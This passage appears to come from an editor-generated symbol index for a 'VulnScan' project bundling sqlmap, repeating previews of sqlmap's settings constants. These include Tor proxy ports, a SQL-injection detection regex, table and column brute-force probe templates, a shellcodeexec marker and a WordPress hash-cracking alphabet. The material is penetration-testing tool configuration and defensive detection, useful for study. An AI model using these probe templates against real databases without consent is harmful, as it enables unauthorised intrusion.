        "peekOfCode": "DEFAULT_TOR_SOCKS_PORTS = (9050, 9150)\n# Default HTTP ports used by Tor\nDEFAULT_TOR_HTTP_PORTS = (8123, 8118)\n# Percentage below which comparison engine could have problems\nLOW_TEXT_PERCENT = 20\n# Auxiliary value used in isDBMSVersionAtLeast() version comparison correction cases\nVERSION_COMPARISON_CORRECTION = 0.0001\n# These MySQL keywords can't go (alone) into versioned comment form (/*!...*/)\n# Reference: http://dev.mysql.com/doc/refman/5.1/en/function-resolution.html\nIGNORE_SPACE_AFFECTED_KEYWORDS = (\"CAST\", \"COUNT\", \"EXTRACT\", \"GROUP_CONCAT\", \"MAX\", \"MID\", \"MIN\", \"SESSION_USER\", \"SUBSTR\", \"SUBSTRING\", \"SUM\", \"SYSTEM_USER\", \"TRIM\")",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "DEFAULT_TOR_HTTP_PORTS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "DEFAULT_TOR_HTTP_PORTS = (8123, 8118)\n# Percentage below which comparison engine could have problems\nLOW_TEXT_PERCENT = 20\n# Auxiliary value used in isDBMSVersionAtLeast() version comparison correction cases\nVERSION_COMPARISON_CORRECTION = 0.0001\n# These MySQL keywords can't go (alone) into versioned comment form (/*!...*/)\n# Reference: http://dev.mysql.com/doc/refman/5.1/en/function-resolution.html\nIGNORE_SPACE_AFFECTED_KEYWORDS = (\"CAST\", \"COUNT\", \"EXTRACT\", \"GROUP_CONCAT\", \"MAX\", \"MID\", \"MIN\", \"SESSION_USER\", \"SUBSTR\", \"SUBSTRING\", \"SUM\", \"SYSTEM_USER\", \"TRIM\")\n# Keywords expected to be in UPPERCASE in getValue()\nGET_VALUE_UPPERCASE_KEYWORDS = (\"SELECT\", \"FROM\", \"WHERE\", \"DISTINCT\", \"COUNT\")",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "LOW_TEXT_PERCENT",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "LOW_TEXT_PERCENT = 20\n# Auxiliary value used in isDBMSVersionAtLeast() version comparison correction cases\nVERSION_COMPARISON_CORRECTION = 0.0001\n# These MySQL keywords can't go (alone) into versioned comment form (/*!...*/)\n# Reference: http://dev.mysql.com/doc/refman/5.1/en/function-resolution.html\nIGNORE_SPACE_AFFECTED_KEYWORDS = (\"CAST\", \"COUNT\", \"EXTRACT\", \"GROUP_CONCAT\", \"MAX\", \"MID\", \"MIN\", \"SESSION_USER\", \"SUBSTR\", \"SUBSTRING\", \"SUM\", \"SYSTEM_USER\", \"TRIM\")\n# Keywords expected to be in UPPERCASE in getValue()\nGET_VALUE_UPPERCASE_KEYWORDS = (\"SELECT\", \"FROM\", \"WHERE\", \"DISTINCT\", \"COUNT\")\nLEGAL_DISCLAIMER = \"Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program\"\n# After this number of misses reflective removal mechanism is turned off (for speed up reasons)",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "VERSION_COMPARISON_CORRECTION",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "VERSION_COMPARISON_CORRECTION = 0.0001\n# These MySQL keywords can't go (alone) into versioned comment form (/*!...*/)\n# Reference: http://dev.mysql.com/doc/refman/5.1/en/function-resolution.html\nIGNORE_SPACE_AFFECTED_KEYWORDS = (\"CAST\", \"COUNT\", \"EXTRACT\", \"GROUP_CONCAT\", \"MAX\", \"MID\", \"MIN\", \"SESSION_USER\", \"SUBSTR\", \"SUBSTRING\", \"SUM\", \"SYSTEM_USER\", \"TRIM\")\n# Keywords expected to be in UPPERCASE in getValue()\nGET_VALUE_UPPERCASE_KEYWORDS = (\"SELECT\", \"FROM\", \"WHERE\", \"DISTINCT\", \"COUNT\")\nLEGAL_DISCLAIMER = \"Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program\"\n# After this number of misses reflective removal mechanism is turned off (for speed up reasons)\nREFLECTIVE_MISS_THRESHOLD = 20\n# Regular expression used for extracting HTML title",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "IGNORE_SPACE_AFFECTED_KEYWORDS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "IGNORE_SPACE_AFFECTED_KEYWORDS = (\"CAST\", \"COUNT\", \"EXTRACT\", \"GROUP_CONCAT\", \"MAX\", \"MID\", \"MIN\", \"SESSION_USER\", \"SUBSTR\", \"SUBSTRING\", \"SUM\", \"SYSTEM_USER\", \"TRIM\")\n# Keywords expected to be in UPPERCASE in getValue()\nGET_VALUE_UPPERCASE_KEYWORDS = (\"SELECT\", \"FROM\", \"WHERE\", \"DISTINCT\", \"COUNT\")\nLEGAL_DISCLAIMER = \"Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program\"\n# After this number of misses reflective removal mechanism is turned off (for speed up reasons)\nREFLECTIVE_MISS_THRESHOLD = 20\n# Regular expression used for extracting HTML title\nHTML_TITLE_REGEX = r\"(?i)<title>(?P<result>[^<]+)</title>\"\n# Table used for Base64 conversion in WordPress hash cracking routine\nITOA64 = \"./0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\"",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "GET_VALUE_UPPERCASE_KEYWORDS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "GET_VALUE_UPPERCASE_KEYWORDS = (\"SELECT\", \"FROM\", \"WHERE\", \"DISTINCT\", \"COUNT\")\nLEGAL_DISCLAIMER = \"Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program\"\n# After this number of misses reflective removal mechanism is turned off (for speed up reasons)\nREFLECTIVE_MISS_THRESHOLD = 20\n# Regular expression used for extracting HTML title\nHTML_TITLE_REGEX = r\"(?i)<title>(?P<result>[^<]+)</title>\"\n# Table used for Base64 conversion in WordPress hash cracking routine\nITOA64 = \"./0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\"\n# Options/switches to be ignored in command-line parsing (e.g. those passed from Firefox)\nIGNORED_OPTIONS = (\"--compressed\",)",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "LEGAL_DISCLAIMER",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "LEGAL_DISCLAIMER = \"Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program\"\n# After this number of misses reflective removal mechanism is turned off (for speed up reasons)\nREFLECTIVE_MISS_THRESHOLD = 20\n# Regular expression used for extracting HTML title\nHTML_TITLE_REGEX = r\"(?i)<title>(?P<result>[^<]+)</title>\"\n# Table used for Base64 conversion in WordPress hash cracking routine\nITOA64 = \"./0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\"\n# Options/switches to be ignored in command-line parsing (e.g. those passed from Firefox)\nIGNORED_OPTIONS = (\"--compressed\",)\n# Chars used to quickly distinguish if the user provided tainted parameter values",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "REFLECTIVE_MISS_THRESHOLD",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "REFLECTIVE_MISS_THRESHOLD = 20\n# Regular expression used for extracting HTML title\nHTML_TITLE_REGEX = r\"(?i)<title>(?P<result>[^<]+)</title>\"\n# Table used for Base64 conversion in WordPress hash cracking routine\nITOA64 = \"./0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\"\n# Options/switches to be ignored in command-line parsing (e.g. those passed from Firefox)\nIGNORED_OPTIONS = (\"--compressed\",)\n# Chars used to quickly distinguish if the user provided tainted parameter values\nDUMMY_SQL_INJECTION_CHARS = \";()'\"\n# Simple check against dummy users",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "HTML_TITLE_REGEX",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "HTML_TITLE_REGEX = r\"(?i)<title>(?P<result>[^<]+)</title>\"\n# Table used for Base64 conversion in WordPress hash cracking routine\nITOA64 = \"./0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\"\n# Options/switches to be ignored in command-line parsing (e.g. those passed from Firefox)\nIGNORED_OPTIONS = (\"--compressed\",)\n# Chars used to quickly distinguish if the user provided tainted parameter values\nDUMMY_SQL_INJECTION_CHARS = \";()'\"\n# Simple check against dummy users\nDUMMY_USER_INJECTION = r\"(?i)[^\\w](AND|OR)\\s+[^\\s]+[=><]|\\bUNION\\b.+\\bSELECT\\b|\\bSELECT\\b.+\\bFROM\\b|\\b(CONCAT|information_schema|SLEEP|DELAY|FLOOR\\(RAND)\\b\"\n# Extensions skipped by crawler",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "ITOA64",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "ITOA64 = \"./0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\"\n# Options/switches to be ignored in command-line parsing (e.g. those passed from Firefox)\nIGNORED_OPTIONS = (\"--compressed\",)\n# Chars used to quickly distinguish if the user provided tainted parameter values\nDUMMY_SQL_INJECTION_CHARS = \";()'\"\n# Simple check against dummy users\nDUMMY_USER_INJECTION = r\"(?i)[^\\w](AND|OR)\\s+[^\\s]+[=><]|\\bUNION\\b.+\\bSELECT\\b|\\bSELECT\\b.+\\bFROM\\b|\\b(CONCAT|information_schema|SLEEP|DELAY|FLOOR\\(RAND)\\b\"\n# Extensions skipped by crawler\nCRAWL_EXCLUDE_EXTENSIONS = (\"3ds\", \"3g2\", \"3gp\", \"7z\", \"DS_Store\", \"a\", \"aac\", \"adp\", \"ai\", \"aif\", \"aiff\", \"apk\", \"ar\", \"asf\", \"au\", \"avi\", \"bak\", \"bin\", \"bk\", \"bmp\", \"btif\", \"bz2\", \"cab\", \"caf\", \"cgm\", \"cmx\", \"cpio\", \"cr2\", \"dat\", \"deb\", \"djvu\", \"dll\", \"dmg\", \"dmp\", \"dng\", \"doc\", \"docx\", \"dot\", \"dotx\", \"dra\", \"dsk\", \"dts\", \"dtshd\", \"dvb\", \"dwg\", \"dxf\", \"ear\", \"ecelp4800\", \"ecelp7470\", \"ecelp9600\", \"egg\", \"eol\", \"eot\", \"epub\", \"exe\", \"f4v\", \"fbs\", \"fh\", \"fla\", \"flac\", \"fli\", \"flv\", \"fpx\", \"fst\", \"fvt\", \"g3\", \"gif\", \"gz\", \"h261\", \"h263\", \"h264\", \"ico\", \"ief\", \"image\", \"img\", \"ipa\", \"iso\", \"jar\", \"jpeg\", \"jpg\", \"jpgv\", \"jpm\", \"jxr\", \"ktx\", \"lvp\", \"lz\", \"lzma\", \"lzo\", \"m3u\", \"m4a\", \"m4v\", \"mar\", \"mdi\", \"mid\", \"mj2\", \"mka\", \"mkv\", \"mmr\", \"mng\", \"mov\", \"movie\", \"mp3\", \"mp4\", \"mp4a\", \"mpeg\", \"mpg\", \"mpga\", \"mxu\", \"nef\", \"npx\", \"o\", \"oga\", \"ogg\", \"ogv\", \"otf\", \"pbm\", \"pcx\", \"pdf\", \"pea\", \"pgm\", \"pic\", \"png\", \"pnm\", \"ppm\", \"pps\", \"ppt\", \"pptx\", \"ps\", \"psd\", \"pya\", \"pyc\", \"pyo\", \"pyv\", \"qt\", \"rar\", \"ras\", \"raw\", \"rgb\", \"rip\", \"rlc\", \"rz\", \"s3m\", \"s7z\", \"scm\", \"scpt\", \"sgi\", \"shar\", \"sil\", \"smv\", \"so\", \"sub\", \"swf\", \"tar\", \"tbz2\", \"tga\", \"tgz\", \"tif\", \"tiff\", \"tlz\", \"ts\", \"ttf\", \"uvh\", \"uvi\", \"uvm\", \"uvp\", \"uvs\", \"uvu\", \"viv\", \"vob\", \"war\", \"wav\", \"wax\", \"wbmp\", \"wdp\", \"weba\", \"webm\", \"webp\", \"whl\", \"wm\", \"wma\", \"wmv\", \"wmx\", \"woff\", \"woff2\", \"wvx\", \"xbm\", \"xif\", \"xls\", \"xlsx\", \"xlt\", \"xm\", \"xpi\", \"xpm\", \"xwd\", \"xz\", \"z\", \"zip\", \"zipx\")\n# Patterns often seen in HTTP headers containing custom injection marking character '*'",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "IGNORED_OPTIONS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "IGNORED_OPTIONS = (\"--compressed\",)\n# Chars used to quickly distinguish if the user provided tainted parameter values\nDUMMY_SQL_INJECTION_CHARS = \";()'\"\n# Simple check against dummy users\nDUMMY_USER_INJECTION = r\"(?i)[^\\w](AND|OR)\\s+[^\\s]+[=><]|\\bUNION\\b.+\\bSELECT\\b|\\bSELECT\\b.+\\bFROM\\b|\\b(CONCAT|information_schema|SLEEP|DELAY|FLOOR\\(RAND)\\b\"\n# Extensions skipped by crawler\nCRAWL_EXCLUDE_EXTENSIONS = (\"3ds\", \"3g2\", \"3gp\", \"7z\", \"DS_Store\", \"a\", \"aac\", \"adp\", \"ai\", \"aif\", \"aiff\", \"apk\", \"ar\", \"asf\", \"au\", \"avi\", \"bak\", \"bin\", \"bk\", \"bmp\", \"btif\", \"bz2\", \"cab\", \"caf\", \"cgm\", \"cmx\", \"cpio\", \"cr2\", \"dat\", \"deb\", \"djvu\", \"dll\", \"dmg\", \"dmp\", \"dng\", \"doc\", \"docx\", \"dot\", \"dotx\", \"dra\", \"dsk\", \"dts\", \"dtshd\", \"dvb\", \"dwg\", \"dxf\", \"ear\", \"ecelp4800\", \"ecelp7470\", \"ecelp9600\", \"egg\", \"eol\", \"eot\", \"epub\", \"exe\", \"f4v\", \"fbs\", \"fh\", \"fla\", \"flac\", \"fli\", \"flv\", \"fpx\", \"fst\", \"fvt\", \"g3\", \"gif\", \"gz\", \"h261\", \"h263\", \"h264\", \"ico\", \"ief\", \"image\", \"img\", \"ipa\", \"iso\", \"jar\", \"jpeg\", \"jpg\", \"jpgv\", \"jpm\", \"jxr\", \"ktx\", \"lvp\", \"lz\", \"lzma\", \"lzo\", \"m3u\", \"m4a\", \"m4v\", \"mar\", \"mdi\", \"mid\", \"mj2\", \"mka\", \"mkv\", \"mmr\", \"mng\", \"mov\", \"movie\", \"mp3\", \"mp4\", \"mp4a\", \"mpeg\", \"mpg\", \"mpga\", \"mxu\", \"nef\", \"npx\", \"o\", \"oga\", \"ogg\", \"ogv\", \"otf\", \"pbm\", \"pcx\", \"pdf\", \"pea\", \"pgm\", \"pic\", \"png\", \"pnm\", \"ppm\", \"pps\", \"ppt\", \"pptx\", \"ps\", \"psd\", \"pya\", \"pyc\", \"pyo\", \"pyv\", \"qt\", \"rar\", \"ras\", \"raw\", \"rgb\", \"rip\", \"rlc\", \"rz\", \"s3m\", \"s7z\", \"scm\", \"scpt\", \"sgi\", \"shar\", \"sil\", \"smv\", \"so\", \"sub\", \"swf\", \"tar\", \"tbz2\", \"tga\", \"tgz\", \"tif\", \"tiff\", \"tlz\", \"ts\", \"ttf\", \"uvh\", \"uvi\", \"uvm\", \"uvp\", \"uvs\", \"uvu\", \"viv\", \"vob\", \"war\", \"wav\", \"wax\", \"wbmp\", \"wdp\", \"weba\", \"webm\", \"webp\", \"whl\", \"wm\", \"wma\", \"wmv\", \"wmx\", \"woff\", \"woff2\", \"wvx\", \"xbm\", \"xif\", \"xls\", \"xlsx\", \"xlt\", \"xm\", \"xpi\", \"xpm\", \"xwd\", \"xz\", \"z\", \"zip\", \"zipx\")\n# Patterns often seen in HTTP headers containing custom injection marking character '*'\nPROBLEMATIC_CUSTOM_INJECTION_PATTERNS = r\"(;q=[^;']+)|(\\*/\\*)\"\n# Template used for common table existence check",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "DUMMY_SQL_INJECTION_CHARS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "DUMMY_SQL_INJECTION_CHARS = \";()'\"\n# Simple check against dummy users\nDUMMY_USER_INJECTION = r\"(?i)[^\\w](AND|OR)\\s+[^\\s]+[=><]|\\bUNION\\b.+\\bSELECT\\b|\\bSELECT\\b.+\\bFROM\\b|\\b(CONCAT|information_schema|SLEEP|DELAY|FLOOR\\(RAND)\\b\"\n# Extensions skipped by crawler\nCRAWL_EXCLUDE_EXTENSIONS = (\"3ds\", \"3g2\", \"3gp\", \"7z\", \"DS_Store\", \"a\", \"aac\", \"adp\", \"ai\", \"aif\", \"aiff\", \"apk\", \"ar\", \"asf\", \"au\", \"avi\", \"bak\", \"bin\", \"bk\", \"bmp\", \"btif\", \"bz2\", \"cab\", \"caf\", \"cgm\", \"cmx\", \"cpio\", \"cr2\", \"dat\", \"deb\", \"djvu\", \"dll\", \"dmg\", \"dmp\", \"dng\", \"doc\", \"docx\", \"dot\", \"dotx\", \"dra\", \"dsk\", \"dts\", \"dtshd\", \"dvb\", \"dwg\", \"dxf\", \"ear\", \"ecelp4800\", \"ecelp7470\", \"ecelp9600\", \"egg\", \"eol\", \"eot\", \"epub\", \"exe\", \"f4v\", \"fbs\", \"fh\", \"fla\", \"flac\", \"fli\", \"flv\", \"fpx\", \"fst\", \"fvt\", \"g3\", \"gif\", \"gz\", \"h261\", \"h263\", \"h264\", \"ico\", \"ief\", \"image\", \"img\", \"ipa\", \"iso\", \"jar\", \"jpeg\", \"jpg\", \"jpgv\", \"jpm\", \"jxr\", \"ktx\", \"lvp\", \"lz\", \"lzma\", \"lzo\", \"m3u\", \"m4a\", \"m4v\", \"mar\", \"mdi\", \"mid\", \"mj2\", \"mka\", \"mkv\", \"mmr\", \"mng\", \"mov\", \"movie\", \"mp3\", \"mp4\", \"mp4a\", \"mpeg\", \"mpg\", \"mpga\", \"mxu\", \"nef\", \"npx\", \"o\", \"oga\", \"ogg\", \"ogv\", \"otf\", \"pbm\", \"pcx\", \"pdf\", \"pea\", \"pgm\", \"pic\", \"png\", \"pnm\", \"ppm\", \"pps\", \"ppt\", \"pptx\", \"ps\", \"psd\", \"pya\", \"pyc\", \"pyo\", \"pyv\", \"qt\", \"rar\", \"ras\", \"raw\", \"rgb\", \"rip\", \"rlc\", \"rz\", \"s3m\", \"s7z\", \"scm\", \"scpt\", \"sgi\", \"shar\", \"sil\", \"smv\", \"so\", \"sub\", \"swf\", \"tar\", \"tbz2\", \"tga\", \"tgz\", \"tif\", \"tiff\", \"tlz\", \"ts\", \"ttf\", \"uvh\", \"uvi\", \"uvm\", \"uvp\", \"uvs\", \"uvu\", \"viv\", \"vob\", \"war\", \"wav\", \"wax\", \"wbmp\", \"wdp\", \"weba\", \"webm\", \"webp\", \"whl\", \"wm\", \"wma\", \"wmv\", \"wmx\", \"woff\", \"woff2\", \"wvx\", \"xbm\", \"xif\", \"xls\", \"xlsx\", \"xlt\", \"xm\", \"xpi\", \"xpm\", \"xwd\", \"xz\", \"z\", \"zip\", \"zipx\")\n# Patterns often seen in HTTP headers containing custom injection marking character '*'\nPROBLEMATIC_CUSTOM_INJECTION_PATTERNS = r\"(;q=[^;']+)|(\\*/\\*)\"\n# Template used for common table existence check\nBRUTE_TABLE_EXISTS_TEMPLATE = \"EXISTS(SELECT %d FROM %s)\"\n# Template used for common column existence check",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "DUMMY_USER_INJECTION",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "DUMMY_USER_INJECTION = r\"(?i)[^\\w](AND|OR)\\s+[^\\s]+[=><]|\\bUNION\\b.+\\bSELECT\\b|\\bSELECT\\b.+\\bFROM\\b|\\b(CONCAT|information_schema|SLEEP|DELAY|FLOOR\\(RAND)\\b\"\n# Extensions skipped by crawler\nCRAWL_EXCLUDE_EXTENSIONS = (\"3ds\", \"3g2\", \"3gp\", \"7z\", \"DS_Store\", \"a\", \"aac\", \"adp\", \"ai\", \"aif\", \"aiff\", \"apk\", \"ar\", \"asf\", \"au\", \"avi\", \"bak\", \"bin\", \"bk\", \"bmp\", \"btif\", \"bz2\", \"cab\", \"caf\", \"cgm\", \"cmx\", \"cpio\", \"cr2\", \"dat\", \"deb\", \"djvu\", \"dll\", \"dmg\", \"dmp\", \"dng\", \"doc\", \"docx\", \"dot\", \"dotx\", \"dra\", \"dsk\", \"dts\", \"dtshd\", \"dvb\", \"dwg\", \"dxf\", \"ear\", \"ecelp4800\", \"ecelp7470\", \"ecelp9600\", \"egg\", \"eol\", \"eot\", \"epub\", \"exe\", \"f4v\", \"fbs\", \"fh\", \"fla\", \"flac\", \"fli\", \"flv\", \"fpx\", \"fst\", \"fvt\", \"g3\", \"gif\", \"gz\", \"h261\", \"h263\", \"h264\", \"ico\", \"ief\", \"image\", \"img\", \"ipa\", \"iso\", \"jar\", \"jpeg\", \"jpg\", \"jpgv\", \"jpm\", \"jxr\", \"ktx\", \"lvp\", \"lz\", \"lzma\", \"lzo\", \"m3u\", \"m4a\", \"m4v\", \"mar\", \"mdi\", \"mid\", \"mj2\", \"mka\", \"mkv\", \"mmr\", \"mng\", \"mov\", \"movie\", \"mp3\", \"mp4\", \"mp4a\", \"mpeg\", \"mpg\", \"mpga\", \"mxu\", \"nef\", \"npx\", \"o\", \"oga\", \"ogg\", \"ogv\", \"otf\", \"pbm\", \"pcx\", \"pdf\", \"pea\", \"pgm\", \"pic\", \"png\", \"pnm\", \"ppm\", \"pps\", \"ppt\", \"pptx\", \"ps\", \"psd\", \"pya\", \"pyc\", \"pyo\", \"pyv\", \"qt\", \"rar\", \"ras\", \"raw\", \"rgb\", \"rip\", \"rlc\", \"rz\", \"s3m\", \"s7z\", \"scm\", \"scpt\", \"sgi\", \"shar\", \"sil\", \"smv\", \"so\", \"sub\", \"swf\", \"tar\", \"tbz2\", \"tga\", \"tgz\", \"tif\", \"tiff\", \"tlz\", \"ts\", \"ttf\", \"uvh\", \"uvi\", \"uvm\", \"uvp\", \"uvs\", \"uvu\", \"viv\", \"vob\", \"war\", \"wav\", \"wax\", \"wbmp\", \"wdp\", \"weba\", \"webm\", \"webp\", \"whl\", \"wm\", \"wma\", \"wmv\", \"wmx\", \"woff\", \"woff2\", \"wvx\", \"xbm\", \"xif\", \"xls\", \"xlsx\", \"xlt\", \"xm\", \"xpi\", \"xpm\", \"xwd\", \"xz\", \"z\", \"zip\", \"zipx\")\n# Patterns often seen in HTTP headers containing custom injection marking character '*'\nPROBLEMATIC_CUSTOM_INJECTION_PATTERNS = r\"(;q=[^;']+)|(\\*/\\*)\"\n# Template used for common table existence check\nBRUTE_TABLE_EXISTS_TEMPLATE = \"EXISTS(SELECT %d FROM %s)\"\n# Template used for common column existence check\nBRUTE_COLUMN_EXISTS_TEMPLATE = \"EXISTS(SELECT %s FROM %s)\"\n# Data inside shellcodeexec to be filled with random string",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "CRAWL_EXCLUDE_EXTENSIONS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "CRAWL_EXCLUDE_EXTENSIONS = (\"3ds\", \"3g2\", \"3gp\", \"7z\", \"DS_Store\", \"a\", \"aac\", \"adp\", \"ai\", \"aif\", \"aiff\", \"apk\", \"ar\", \"asf\", \"au\", \"avi\", \"bak\", \"bin\", \"bk\", \"bmp\", \"btif\", \"bz2\", \"cab\", \"caf\", \"cgm\", \"cmx\", \"cpio\", \"cr2\", \"dat\", \"deb\", \"djvu\", \"dll\", \"dmg\", \"dmp\", \"dng\", \"doc\", \"docx\", \"dot\", \"dotx\", \"dra\", \"dsk\", \"dts\", \"dtshd\", \"dvb\", \"dwg\", \"dxf\", \"ear\", \"ecelp4800\", \"ecelp7470\", \"ecelp9600\", \"egg\", \"eol\", \"eot\", \"epub\", \"exe\", \"f4v\", \"fbs\", \"fh\", \"fla\", \"flac\", \"fli\", \"flv\", \"fpx\", \"fst\", \"fvt\", \"g3\", \"gif\", \"gz\", \"h261\", \"h263\", \"h264\", \"ico\", \"ief\", \"image\", \"img\", \"ipa\", \"iso\", \"jar\", \"jpeg\", \"jpg\", \"jpgv\", \"jpm\", \"jxr\", \"ktx\", \"lvp\", \"lz\", \"lzma\", \"lzo\", \"m3u\", \"m4a\", \"m4v\", \"mar\", \"mdi\", \"mid\", \"mj2\", \"mka\", \"mkv\", \"mmr\", \"mng\", \"mov\", \"movie\", \"mp3\", \"mp4\", \"mp4a\", \"mpeg\", \"mpg\", \"mpga\", \"mxu\", \"nef\", \"npx\", \"o\", \"oga\", \"ogg\", \"ogv\", \"otf\", \"pbm\", \"pcx\", \"pdf\", \"pea\", \"pgm\", \"pic\", \"png\", \"pnm\", \"ppm\", \"pps\", \"ppt\", \"pptx\", \"ps\", \"psd\", \"pya\", \"pyc\", \"pyo\", \"pyv\", \"qt\", \"rar\", \"ras\", \"raw\", \"rgb\", \"rip\", \"rlc\", \"rz\", \"s3m\", \"s7z\", \"scm\", \"scpt\", \"sgi\", \"shar\", \"sil\", \"smv\", \"so\", \"sub\", \"swf\", \"tar\", \"tbz2\", \"tga\", \"tgz\", \"tif\", \"tiff\", \"tlz\", \"ts\", \"ttf\", \"uvh\", \"uvi\", \"uvm\", \"uvp\", \"uvs\", \"uvu\", \"viv\", \"vob\", \"war\", \"wav\", \"wax\", \"wbmp\", \"wdp\", \"weba\", \"webm\", \"webp\", \"whl\", \"wm\", \"wma\", \"wmv\", \"wmx\", \"woff\", \"woff2\", \"wvx\", \"xbm\", \"xif\", \"xls\", \"xlsx\", \"xlt\", \"xm\", \"xpi\", \"xpm\", \"xwd\", \"xz\", \"z\", \"zip\", \"zipx\")\n# Patterns often seen in HTTP headers containing custom injection marking character '*'\nPROBLEMATIC_CUSTOM_INJECTION_PATTERNS = r\"(;q=[^;']+)|(\\*/\\*)\"\n# Template used for common table existence check\nBRUTE_TABLE_EXISTS_TEMPLATE = \"EXISTS(SELECT %d FROM %s)\"\n# Template used for common column existence check\nBRUTE_COLUMN_EXISTS_TEMPLATE = \"EXISTS(SELECT %s FROM %s)\"\n# Data inside shellcodeexec to be filled with random string\nSHELLCODEEXEC_RANDOM_STRING_MARKER = b\"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\"\n# Period after last-update to start nagging about the old revision",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "PROBLEMATIC_CUSTOM_INJECTION_PATTERNS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "PROBLEMATIC_CUSTOM_INJECTION_PATTERNS = r\"(;q=[^;']+)|(\\*/\\*)\"\n# Template used for common table existence check\nBRUTE_TABLE_EXISTS_TEMPLATE = \"EXISTS(SELECT %d FROM %s)\"\n# Template used for common column existence check\nBRUTE_COLUMN_EXISTS_TEMPLATE = \"EXISTS(SELECT %s FROM %s)\"\n# Data inside shellcodeexec to be filled with random string\nSHELLCODEEXEC_RANDOM_STRING_MARKER = b\"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\"\n# Period after last-update to start nagging about the old revision\nLAST_UPDATE_NAGGING_DAYS = 180\n# Minimum non-writing chars (e.g. ['\"-:/]) ratio in case of parsed error messages",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "BRUTE_TABLE_EXISTS_TEMPLATE",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
